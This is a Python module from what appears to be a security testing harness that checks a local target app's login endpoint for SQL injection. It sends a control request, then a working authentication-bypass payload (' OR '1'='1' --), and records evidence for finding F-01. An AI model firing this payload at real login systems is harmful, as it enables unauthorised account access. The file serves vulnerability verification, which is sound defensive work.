# sentinel/attacks/sqli.py
"""
F-01: SQL Injection in the login endpoint.

Strategy: run a control request first (a genuinely wrong password, no
injection) to confirm normal auth actually rejects it. Then run the
injection payload. If the control fails but the injection succeeds,
that's proof the vulnerability, not a fluke or an overly permissive
login, is what let us in.
"""
import requests

FINDING_ID = "F-01"
TITLE = "SQL Injection in Login Endpoint"
SEVERITY = "Critical"
AFFECTED_COMPONENT = "target_app/routes/auth.py :: POST /login"

CONTROL_PAYLOAD = {"username": "alice", "password": "definitely_wrong_password"}
EXPLOIT_PAYLOAD = {"username": "alice", "password": "wrong' OR '1'='1' --"}


def attack(base_url: str = "http://localhost:8001") -> dict:
    result = {
        "finding_id": FINDING_ID,
        "title": TITLE,
        "severity": SEVERITY,
        "affected_component": AFFECTED_COMPONENT,
        "vulnerable": False,
        "evidence": None,
        "error": None,
    }

    try:
        control = requests.post(f"{base_url}/login", json=CONTROL_PAYLOAD, timeout=5)
        exploit = requests.post(f"{base_url}/login", json=EXPLOIT_PAYLOAD, timeout=5)
    except requests.RequestException as e:
        result["error"] = f"Could not reach target: {e}"
        return result

    control_rejected = control.status_code != 200 or "token" not in control.json()
    exploit_succeeded = exploit.status_code == 200 and "token" in exploit.json()

    result["vulnerable"] = control_rejected and exploit_succeeded
    if result["vulnerable"]:
        result["evidence"] = {
            "control_payload": CONTROL_PAYLOAD,
            "control_response": control.json() if control.status_code == 200 else control.status_code,
            "exploit_payload": EXPLOIT_PAYLOAD,
            "exploit_response": exploit.json(),
        }

    return result


if __name__ == "__main__":
    import json
    print(json.dumps(attack(), indent=2))